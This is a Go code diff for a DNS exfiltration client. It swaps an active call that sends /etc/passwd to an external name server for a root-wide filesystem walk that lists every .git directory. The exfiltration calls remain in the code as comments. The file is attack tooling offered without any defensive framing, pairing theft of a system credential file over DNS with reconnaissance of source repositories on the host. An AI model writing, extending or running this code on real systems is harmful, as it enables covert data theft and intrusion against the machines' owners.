@@ -1,10 +1,12 @@
 package main
 
 import (
-	"dns-exfiltration-client/exfiltrator"
+	"errors"
+	"fmt"
+	"io/fs"
 	"log"
-
-	"github.com/denisbrodbeck/machineid"
+	"path/filepath"
+	"strings"
 )
 
 const (
@@ -12,11 +14,33 @@ const (
 	DELAY       = 200
 )
 
-func main() {
-	machineId, err := machineid.ID()
+func walk(path string, info fs.FileInfo, err error) error {
 	if err != nil {
-		log.Fatalln(err)
+		if errors.Is(err, fs.ErrPermission) {
+			return nil
+		}
+		if strings.HasPrefix(path, "/proc") {
+			return nil
+		}
+		return err
 	}
-	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(NAME_SERVER, machineId, DELAY)
-	dnsExfiltrator.ExfiltrateFile("/etc/passwd")
+	if info.IsDir() && info.Name() == ".git" {
+		fmt.Println(path)
+	}
+	return nil
+}
+
+func main() {
+	// machineId, err := machineid.ID()
+	// if err != nil {
+	// 	log.Fatalln(err)
+	// }
+
+	err := filepath.Walk("/", walk)
+	if err != nil {
+		log.Println(err)
+	}
+
+	// dnsExfiltrator := exfiltrator.NewDnsExfiltrator(NAME_SERVER, machineId, DELAY)
+	// dnsExfiltrator.ExfiltrateFile("/etc/passwd")
 }
